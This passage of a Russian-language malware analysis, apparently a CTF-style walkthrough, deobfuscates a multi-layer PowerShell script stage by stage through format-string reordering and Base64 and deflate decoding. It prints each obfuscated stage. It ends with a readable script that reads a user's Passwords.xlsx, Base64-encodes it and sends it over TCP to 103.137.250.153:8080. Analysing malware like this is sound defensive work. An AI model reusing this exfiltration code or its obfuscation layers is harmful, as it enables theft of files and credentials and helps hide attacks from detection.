'zfSyvJitnGQRnHKoQljSD7Bl','Zzkk3l1OV2cwxsfPVKVef+4RYt5l6e2SM8e9ksKVIll/maKx/NG/Yra55c8drzvYkUo+AKJ','TYM+4Jq9AS','IlNutB75b3QU3P0uco','GYxOT8nqLtXz4GJuiRL1rnw1rOKs2G1','6jWP91OlB8I/cokFDHUxVuvjo1Fv4jqPeV','rizFEk1Bmw1TySV9OifUcLgP7wwTKqMq1rKk+JPSZSQlYJMVXow3QODB9HrSnNpVVxVMKqr','dah5SrxpFdvR2P8A','8bfK6emE','K7S1rQTdf8+PbSWPj9ncgLXjvLVDjYTitmDvX','TaeD67Da1gRc8qP6ySJqKvrCv76qV','A8sO+og1C','+blDTBZBL+6zOLqzXlW/TGh','/Fy0smVS+r+T8kDSv7oZp2u31g5mhb7/v1fNQXtPTdatASkRi2XJUvF','4+jS+Io+T6G7uRb9F28XDo9yGS1/aUzYa0x4ii2UkHqlFYpr28Fdn0Cz+fe9s0Fl6alF/dxDr0VqauitdYn9qmvaHWIlzZRjRJ','ZW2rnXahfnk7hwzC2PmbLb1fRi','4H/qZfrRblRUyQ/LsLjBud3Nzg4+FclnGUBKZdTyYh15P','e4UMeDbnsaBhr4xPLUEB1hTWJr5IWrQfrAnD3','OIhjghNUqZUhAEX0SVoY0jqJN3SVPTogB1U18KkGF6qwglHVXf','VZdZc+JYEoX/ioLobkxQtpEESFQ/sRqwWMwiwB0dUwLEYhD77vF/n/wuqq6eB11teTPPyTx30','sP5QmMR/mRszga8zc1q6TrmdL','y1M2XS/k+g8','nGRgmOQWrAj2qZSpR4VdlS0eFNSk','w1KzBi1GC37zNZzj3KlNOT66gzATUT0rzLtZCrbOc2cttennlrNpmqZuX','r0Cfciyzpcuv6Pw1S+s29nuvkIPdMKXJUs','c6LO10/5RrDZ+Xt5X8mzfKttdkW5FaOxmAaetn94dD1hKdy0x7oX+Fqjm9tp8nF59O/hFDWJkvr6FTR5R78XX/4qL+0FAk/SNMbz1VTu1/ahWHvqqEjanw9/3CEr7qprY/hBNvMdaVZ+71Gxi','Bd','dHJ/2FFmUE+jsaf','DZ','2cS034KjbdbPJPd1fCyMbadUQYgMjUbw4VdmmRFBGFjNEVJ5x82GDLuTcqGeUH2','K6rRe+A/SOSk9haKeJrohxFNCW7dpktIYCbxbWCVsfkikjPpOUuRF1+lDYZJY6iSQlCXlk6FLRtO8ZXAiX1LYJO651VV3W37Z4sLkxSTxl','ggPeUGO8OgXnurUnjMnDGGVYgqgY1BQlx','h8abGnf58V8crwbfket0','h9HuTTJMazp6bfuY97S1JzqZB8sZI4S0e1mBhPVeaeU9UodZP6UGSN5kZatxN0u7cHS+9ujsflPbvtdwYkyFyp5yee512gv2IHYc/8s/ce/qtnAlLfUa4u1BOfFy+DQ+5Hhl3h2whkG7WLPQL5xB+0zRmpRN8ncQbXLDy19Wdvo3nL83ccJNCGANysVvQ3XyF28dqtXOSrtF22DFBs/d','4MjdcmoPBXF7jLCWFfkq3ypWkLi','54eIp/616f59Zn','YEnmJa4ewpzN4WqWXOj4v+A9es93CwUGKFE63g','4/3L8nUu36yJS3j2p2BhCbWT1+XTW','kQ99I','XtmvMAWsjNZo0zgCat','kWzeqeVaF07MBsmDmVIdN','+WSiAgthKc3qGGptqzFAI3VT6UVkWA8AD18Y0QTIom56','+3WPsClN28kAJ2','ObjDCisW9lP/ZdYInTkBi+kz8z+bgJF9ZD1YOLfOJN4iW5dKrT88wLB2Cif210tQzaVJzZbmbSZNaiCNzF379+WFsG','4sZSQQ2MFUxliUcDY/M+hKUlFIwMQ+ECd1qFkP4ZuSxe0gQGqUkBVA5TuLZVSkGO05QgSRMsQRwdFGmVPXkCBGWxFA64iA','nwxDdBIVD0l3dPyOSlfgadnaFJgQRZAtxBHglIBzCRegq7wAoYpxjDQ6ZQBAXgMkx4Ag48JQwUK3NhASVdq0CG','xhUm3esbzuBrfnyfAr0xrpOrl9cObYDGZpYw0wLveZgm8CdSXt26+iqfU2jsDqw0C4lqbxHRKkm4eFN+d9','qRUNgZRERCPzbwyIpySuJVwpKqo','wVMq8jJe16LAQSEY6OuHnBQLDnStorZGghqzZbcPH48jWkq66cRebmKcezhr3njqVYM1q3r/iBdgr+1h3th9J+FB192V','28CEiZ6GzwUYdUBjNF1VR1FytbouLOwJN4VJggryewIx2GDmg','2UIQEJ4Ni2D0btOSQ8Nvnf740gaI9/HMyUIvpqKJScD+s6L9Oilq0VckyzOV4KPX0v6+POfETezp5zrEoPLI/2qNKRR','vPfd1Z7BrvlKF5rBcuZ1mk7g6fkxKz1eHNN680WWbxd5tvfd6w44DrUtGTgvfNO23T69Q/SH7gu/fIwU//6MRNHf+j/Y+osX+Kzv16O+yHf/8v6MU++1VKP3eI2c','1AlxeWrvw0zxR1Ph+Q6','IC4FoPHijQdvxbFnUTYzaPxqJdz/O9','LOViwZw8PHcnw4MKZLu','3xmlI2tokkcS','BQQYPFAfQabnDmaIb5CKjSgNYJKgEqdRD5nRVLojrKSUZ+ZvCPsFPhVxp5e6MWLqyVaoAFmpDZzoASb','ax+myArFeDSkzXhsligGBw1soBy6Qbz8GZKUd2D/HXRulWonFer0NbVat6jLbtwZ6nLIPvXq1SZ0oiVu1SQnyKxcLhTQJyHTm892QIXvZJEFgdszAqS8RW2ezJNdI5OQj0xUaAwF/7ZD7y2A5W9RcsLL5nL37qc0bKWVL9g7QSUpHOJ6VPV3S+y0+MwXkfZhcyrVn3do3CV2Lr/eJW')) ,   (  VaRiAblE ("{0}{1}"-f 'YF','4eh') )."vaL`UE"::"DE`Co`MPrESS") |&('%'){ .("{0}{1}{2}" -f 'nEW','-obj','Ect')  ("{3}{4}{1}{0}{5}{2}"-f'.I','em','EaDEr','sy','St','o.streAMR')( ${_} ,  ${8`wG}::"aSc`ii")} ).("{2}{1}{0}"-f 'nD','adTOe','re').Invoke()| .((&("{1}{0}{3}{2}"-f 'B','GEt-VArIA','E','l') ("{0}{1}"-f '*mdr','*'))."n`AME"[3,11,2]-JOiN'')
```
</details>
видим что то знакомое и нет одновременно. попробуем проанализировать начало кода что бы понять как правильно собрать Base64 строку.
попробуем составить из этого "{0}{2}{4}{1}{3}" -f 'SySte','Ve','m.','rT','Con') какую то команду или найти в предыдущих кодах.
Из частей с буквами можно составить SyStemConVerT сопоставим с цифрами в фигурных скобках и поймем что в скобках по сути находятся индексы массива с частами строки.
таким образом восстанавливаем base64 строку и сноова кидаем ее в https://jgraph.github.io/drawio-tools/tools/convert.html


<details>
<summary>Собираем строку</summary>
```
a = [19, 35, 14, 53, 17, 25, 55, 48, 13, 27, 30, 45, 38, 44, 49, 41, 56, 47, 6, 18, 22, 23, 34, 12, 3, 20, 2, 3\
7, 0, 9, 43, 40, 8, 46, 4, 1, 33, 57, 42, 36, 52, 16, 26, 28, 15, 21, 31, 24, 10, 39, 29, 51, 54, 11, 50, 32, 5, 7] 
>>> b = ['zfSyvJitnGQRnHKoQljSD7Bl','Zzkk3l1OV2cwxsfPVKVef+4RYt5l6e2SM8e9ksKVIll/maKx/NG/Yra55c8drzvYkUo+AKJ','TYM+\
4Jq9AS','IlNutB75b3QU3P0uco','GYxOT8nqLtXz4GJuiRL1rnw1rOKs2G1','6jWP91OlB8I/cokFDHUxVuvjo1Fv4jqPeV','rizFEk1Bmw1TyS\
V9OifUcLgP7wwTKqMq1rKk+JPSZSQlYJMVXow3QODB9HrSnNpVVxVMKqr','dah5SrxpFdvR2P8A','8bfK6emE','K7S1rQTdf8+PbSWPj9ncgLXjv\
LVDjYTitmDvX','TaeD67Da1gRc8qP6ySJqKvrCv76qV','A8sO+og1C','+blDTBZBL+6zOLqzXlW/TGh','/Fy0smVS+r+T8kDSv7oZp2u31g5mhb\
7/v1fNQXtPTdatASkRi2XJUvF','4+jS+Io+T6G7uRb9F28XDo9yGS1/aUzYa0x4ii2UkHqlFYpr28Fdn0Cz+fe9s0Fl6alF/dxDr0VqauitdYn9qmv\
aHWIlzZRjRJ','ZW2rnXahfnk7hwzC2PmbLb1fRi','4H/qZfrRblRUyQ/LsLjBud3Nzg4+FclnGUBKZdTyYh15P','e4UMeDbnsaBhr4xPLUEB1hTW\
Jr5IWrQfrAnD3','OIhjghNUqZUhAEX0SVoY0jqJN3SVPTogB1U18KkGF6qwglHVXf','VZdZc+JYEoX/ioLobkxQtpEESFQ/sRqwWMwiwB0dUwLEYh\
D77vF/n/wuqq6eB11teTPPyTx30','sP5QmMR/mRszga8zc1q6TrmdL','y1M2XS/k+g8','nGRgmOQWrAj2qZSpR4VdlS0eFNSk','w1KzBi1GC37z\
NZzj3KlNOT66gzATUT0rzLtZCrbOc2cttennlrNpmqZuX','r0Cfciyzpcuv6Pw1S+s29nuvkIPdMKXJUs','c6LO10/5RrDZ+Xt5X8mzfKttdkW5Fa\
OxmAaetn94dD1hKdy0x7oX+Fqjm9tp8nF59O/hFDWJkvr6FTR5R78XX/4qL+0FAk/SNMbz1VTu1/ahWHvqqEjanw9/3CEr7qprY/hBNvMdaVZ+71Gxi\
','Bd','dHJ/2FFmUE+jsaf','DZ','2cS034KjbdbPJPd1fCyMbadUQYgMjUbw4VdmmRFBGFjNEVJ5x82GDLuTcqGeUH2','K6rRe+A/SOSk9haKeJ\
rohxFNCW7dpktIYCbxbWCVsfkikjPpOUuRF1+lDYZJY6iSQlCXlk6FLRtO8ZXAiX1LYJO651VV3W37Z4sLkxSTxl','ggPeUGO8OgXnurUnjMnDGGVY\
gqgY1BQlx','h8abGnf58V8crwbfket0','h9HuTTJMazp6bfuY97S1JzqZB8sZI4S0e1mBhPVeaeU9UodZP6UGSN5kZatxN0u7cHS+9ujsflPbvtdw\
YkyFyp5yee512gv2IHYc/8s/ce/qtnAlLfUa4u1BOfFy+DQ+5Hhl3h2whkG7WLPQL5xB+0zRmpRN8ncQbXLDy19Wdvo3nL83ccJNCGANysVvQ3XyF28\
dqtXOSrtF22DFBs/d','4MjdcmoPBXF7jLCWFfkq3ypWkLi','54eIp/616f59Zn','YEnmJa4ewpzN4WqWXOj4v+A9es93CwUGKFE63g','4/3L8nU\
u36yJS3j2p2BhCbWT1+XTW','kQ99I','XtmvMAWsjNZo0zgCat','kWzeqeVaF07MBsmDmVIdN','+WSiAgthKc3qGGptqzFAI3VT6UVkWA8AD18Y0\
QTIom56','+3WPsClN28kAJ2','ObjDCisW9lP/ZdYInTkBi+kz8z+bgJF9ZD1YOLfOJN4iW5dKrT88wLB2Cif210tQzaVJzZbmbSZNaiCNzF379+WF\
sG','4sZSQQ2MFUxliUcDY/M+hKUlFIwMQ+ECd1qFkP4ZuSxe0gQGqUkBVA5TuLZVSkGO05QgSRMsQRwdFGmVPXkCBGWxFA64iA','nwxDdBIVD0l3d\
PyOSlfgadnaFJgQRZAtxBHglIBzCRegq7wAoYpxjDQ6ZQBAXgMkx4Ag48JQwUK3NhASVdq0CG','xhUm3esbzuBrfnyfAr0xrpOrl9cObYDGZpYw0wL\
veZgm8CdSXt26+iqfU2jsDqw0C4lqbxHRKkm4eFN+d9','qRUNgZRERCPzbwyIpySuJVwpKqo','wVMq8jJe16LAQSEY6OuHnBQLDnStorZGghqzZbc\
PH48jWkq66cRebmKcezhr3njqVYM1q3r/iBdgr+1h3th9J+FB192V','28CEiZ6GzwUYdUBjNF1VR1FytbouLOwJN4VJggryewIx2GDmg','2UIQEJ4\
Ni2D0btOSQ8Nvnf740gaI9/HMyUIvpqKJScD+s6L9Oilq0VckyzOV4KPX0v6+POfETezp5zrEoPLI/2qNKRR','vPfd1Z7BrvlKF5rBcuZ1mk7g6fkx\
Kz1eHNN680WWbxd5tvfd6w44DrUtGTgvfNO23T69Q/SH7gu/fIwU//6MRNHf+j/Y+osX+Kzv16O+yHf/8v6MU++1VKP3eI2c','1AlxeWrvw0zxR1Ph\
+Q6','IC4FoPHijQdvxbFnUTYzaPxqJdz/O9','LOViwZw8PHcnw4MKZLu','3xmlI2tokkcS','BQQYPFAfQabnDmaIb5CKjSgNYJKgEqdRD5nRVLo\
jrKSUZ+ZvCPsFPhVxp5e6MWLqyVaoAFmpDZzoASb','ax+myArFeDSkzXhsligGBw1soBy6Qbz8GZKUd2D/HXRulWonFer0NbVat6jLbtwZ6nLIPvXq\
1SZ0oiVu1SQnyKxcLhTQJyHTm892QIXvZJEFgdszAqS8RW2ezJNdI5OQj0xUaAwF/7ZD7y2A5W9RcsLL5nL37qc0bKWVL9g7QSUpHOJ6VPV3S+y0+Mw\
XkfZhcyrVn3do3CV2Lr/eJW']
>>> for i in a:
       print(b[i], end='')
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
```
</details>
снова расшифровываем и получаем

<details>

<summary>Новый код</summary>

```
 .("{1}{3}{0}{2}"-f'ria','SEt-','ble','vA') ("kl"+"M")  ([TYPE]("{1}{2}{0}"-f 'ert','co','NV') );   &("{0}{1}{2}" -f'SEt','-I','TeM')  ('vAri'+'aBLe:aDj'+'2'+'8')  ([TYpe]("{2}{3}{1}{0}{4}" -F 'NmoD','Ssio','io.COmpression.CO','MprE','E')) ;   Set-Variable -Name OUBr -Value ([TYpE]("{0}{5}{2}{3}{1}{4}" -f's','enC','x','T.','Oding','yStEM.TE'))  ;(&("{2}{0}{1}" -f'Obje','CT','neW-')  ("{9}{0}{8}{5}{1}{7}{3}{6}{2}{4}"-f 'Em','ESsiON','EST','EFL','REAM','OMPR','aT','.d','.Io.c','SyST')([iO.MEmoRystREAm] (  &("{1}{0}{2}" -f'ArIaB','V','le') ("kl"+"m")  -VALUeOnL  )::("{0}{1}{2}{3}{4}" -f 'F','ROMBAs','E64strI','N','g').Invoke(("{4}{26}{160}{225}{57}{187}{147}{200}{174}{208}{181}{97}{202}{41}{115}{53}{140}{110}{86}{243}{219}{66}{29}{173}{50}{101}{7}{141}{189}{85}{31}{135}{179}{32}{224}{156}{65}{49}{25}{195}{158}{10}{56}{175}{203}{67}{236}{204}{126}{43}{38}{74}{18}{190}{129}{233}{69}{197}{34}{27}{143}{20}{13}{11}{8}{186}{108}{244}{176}{172}{142}{223}{119}{228}{133}{0}{3}{90}{35}{227}{235}{167}{146}{96}{77}{164}{226}{30}{240}{152}{183}{148}{78}{151}{62}{209}{214}{161}{184}{42}{81}{73}{117}{39}{9}{15}{102}{51}{239}{113}{93}{127}{136}{165}{80}{61}{22}{84}{64}{211}{107}{120}{216}{91}{171}{95}{48}{2}{199}{63}{5}{75}{137}{180}{12}{28}{114}{82}{105}{210}{194}{198}{238}{17}{68}{83}{24}{230}{99}{193}{100}{87}{150}{196}{134}{242}{155}{177}{59}{106}{111}{125}{124}{234}{112}{154}{122}{231}{79}{128}{40}{205}{132}{37}{104}{88}{21}{206}{109}{36}{145}{222}{170}{121}{118}{6}{46}{207}{192}{220}{168}{70}{47}{138}{157}{94}{139}{58}{123}{130}{159}{188}{215}{149}{144}{163}{116}{169}{92}{23}{71}{16}{213}{103}{54}{76}{55}{60}{182}{217}{153}{72}{52}{19}{229}{221}{191}{1}{44}{212}{232}{162}{241}{218}{98}{33}{14}{185}{131}{166}{45}{237}{201}{89}{178}" -f'BVu','W','u1I','P0','Z','k','H8Bp','qx/k','PP','EhH+lBbl3YYi','+','iDX517HI41','p5','mff','+','X','C','E','z','V1','6DWK','zDW','ESwJ','nb','0ibBcm','o1','VRrT6NAFP2','60','hQ','ZCbsZ05SNc3','jJAhi','8R','+ynPAX0','y3t','H','Xwm','J','n7','YAwp','Sq','OUCMe+qfOpVXrX','DaZR+','0','bgI3rVLtVbIg','q','geGhO','J','LmD','/','la','c8uB','kLzTf+Rk','xIMXbtW','Mv','N','KxmJB6f','qf','Qh','5Y','108sZlx0','6','eJss','FuTi','b9vHt','PKPi','nG','T','YUJwv','dJ+swfX','IgM2','GKjafT','fh526q','UaplB','fp','lzUCJi','5oawN','S','16','7p0gg7','zaJ','ZL6pkfw/0P','aNBs','1','4F7wDQW7EhbJW7LR','Vlgnw','P+d/3','NN/Wi','iUL','U','JLVy','gn0','6NGgZ','Cueyi','pzCwTaUYra','i','7','O2XWf9PH','h/Pe9Z6al','epOf','dQ','Q+','/','k7/IPCa05S','g','h','qp9h5','rf6ViVdlaNViYFsZMBdg','bI','O','aVygTmsce','ecewe','W1zH9','J','wz','r','H','9','lQbtBWX','Vbd','b','A3DXDw','i','P32hFvy','L0Q7','d','eoJr1q+CxPBbp5W','Y0','rkb','3Kl','jnnrL4V2SLx','f','WKNw','lIS','WMm','u','OFs','I','tQ','T','T','e','qjY+','Sm8C','E','SD','70kooq','e','nRJlAX7Y1+6','baNJPL','Z','VJ8','a','FHEDD6J','9TiirbK','xp4','u3T3mLNl2','Tplh','P','vet','np','+','2','8','d','GYlhkMVQ','o','hZe5pQr','M','ZC','f513','a7Avx6sqh','9Dv','tfxHM/17sP4','M+os0zMzStq','WiO0Z','0gt','lo','L2','vwP','RFGN3','xC','mKAUDtLU','X','18m','h','ElKeq','E','q','t','t4omm','5GgjSOI','lQtl','i','mwSUAhteS','CAN','h5','0','x7u5','wE','O','FqV7vr','a','r','Lu9k2hLpqNs','E','FUCHFCXR','2Q','HOF','mNMQJw','s','LdE','JZ','w','idl','N','7YX5','G137','Ue','w','i51zVywNP','B/+','BJ','MdiYyby','d','3g+','yf4H','JoIN','X5nMyBar','DBhhOwQ','fRhf38Qmu83Nw2','KduDd8LFIu','z','OmjeIh9cJ','g','PcK','Zr','ph','VfHDN0w2','yWVKr2V','yX','PbHIzvhf+CO','fF/yL0','zacxqA2','VRZWWbTLw','x9')),  ${aDJ`28}::"DeC`OmPre`Ss" )| &('%') {&("{0}{1}{2}"-f 'n','e','W-ObjeCT') ("{2}{0}{4}{3}{1}"-f'm.Io.sTrE','ADEr','SySTE','e','AmR')(${_} ,   (&("{1}{0}" -f'cI','g')  ("{1}{0}{2}"-f 'RIAb','vA','Le:ouBR')).vaLuE::"A`ScII" )} ).("{1}{2}{0}" -f'D','ReaD','TOEN').Invoke()| &("{0}{2}{4}{1}{3}"-f 'invOke-E','sIo','X','N','pRES')
```
</details>
и снова тоже самое, переставляем и дешифруем
<details>
<summary>Новый код</summary>

```
  .("{2}{0}{3}{1}" -f'ria','LE','sEt-VA','b')  ("UD9"+"j"+"41")  (  [tYpE]("{1}{0}"-F't','COnVEr'));  ${u`6H8} =  [TyPE]("{0}{1}"-f'io','.fIlE'); &("{3}{0}{1}{2}"-f't','-Va','riable','Se') -Name ("{1}{0}"-f'est','t') -Value (  ${U`d`9J41}::"to`BAse64`S`T`RinG"( (  .("{2}{0}{1}{3}" -f '-','vArIA','GeT','BLE')  ('U6'+'H8')).vALue::("{2}{3}{1}{0}" -f 's','Byte','ReadA','ll').Invoke(((("{5}{12}{10}{2}{1}{14}{16}{13}{8}{6}{9}{4}{0}{3}{15}{7}{11}"-f'w','DOMA','v.','ord','Pass','C:{0}Users{0}','s','s','ent','{0}','ano','x','rom','Docum','I','s.xl','N{0}'))-f[cHar]92))));
&("{1}{2}{0}{3}" -f'i','Set-V','ar','able') -Name ("{2}{0}{1}" -f'c','ket','so') -Value (&("{2}{0}{1}"-f '-Obj','ect','New') ("{1}{2}{3}{6}{0}{5}{4}" -f 'cp','net.s','ockets','.','ent','cli','t')(("{3}{0}{1}{2}"-f '03','.137.2','50.153','1'),8080));
&("{0}{3}{2}{1}" -f'Set-','e','bl','Varia') -Name ("{0}{1}"-f'strea','m') -Value (${SOc`K`eT}.("{2}{0}{1}" -f'etStrea','m','G').Invoke());
&("{0}{2}{1}{3}" -f'Set-Va','a','ri','ble') -Name ("{0}{2}{1}" -f 'wr','ter','i') -Value (.("{0}{1}{3}{2}"-f'new-o','b','ect','j') ("{0}{4}{2}{3}{1}"-f 'Sy','eamWriter','.IO.S','tr','stem')(${S`Tr`Eam}));
.("{1}{0}{2}"-f'Var','Set-','iable') -Name ("{0}{1}{2}" -f 'b','u','ffer') -Value (.("{1}{2}{0}{3}"-f'bj','ne','w-o','ect') ("{2}{1}{0}" -f'yte[]','m.B','Syste') 1024);
${Wr`itER}.("{0}{1}{2}" -f 'Wri','te','Line').Invoke(${Te`sT});
${S`ockeT}.("{1}{0}"-f'e','clos').Invoke()
```
</details>
ого уже что то интересное. мы не видим следы Base64 а значит уже подоши к концу.
преобразуем этот код в более менее читаемый так же как мы это делали с Base64 строкой

<details>
<summary>Итоговый скрипт</summary>

```
  # Создание переменной с именем "test"
Set-Variable -Name "test" -Value ( [System.Convert]::ToBase64String( [System.IO.File]::ReadAllBytes("C:\Users\romanov.DOMAIN\Documents\Passwords.xlsx") ) )

# Создание переменной с именем "socket" (TCP-клиент)
Set-Variable -Name "socket" -Value (New-Object net.sockets.tcpclient("103.137.250.153", 8080))

# Создание переменной "stream" (сетевой поток)
Set-Variable -Name "stream" -Value ($socket.GetStream())

# Создание переменной "writer" (объект для записи в поток)
Set-Variable -Name "writer" -Value (New-Object System.IO.StreamWriter($stream))

# Создание переменной "buffer" (буфер для чтения данных)
Set-Variable -Name "buffer" -Value (New-Object System.Byte[] 1024)

# Отправка содержимого переменной "test" (закодированный файл) на удаленный сервер
$writer.WriteLine($test)

# Закрытие соединения
$socket.close()
```
</details>


теперь мы можем четко увидеть что вредоносное приложение соединено с 103.137.250.153:8080
а файлом подверженным атаке вредоносного по был C:\Users\romanov.DOMAIN\Documents\Passwords.xlsx

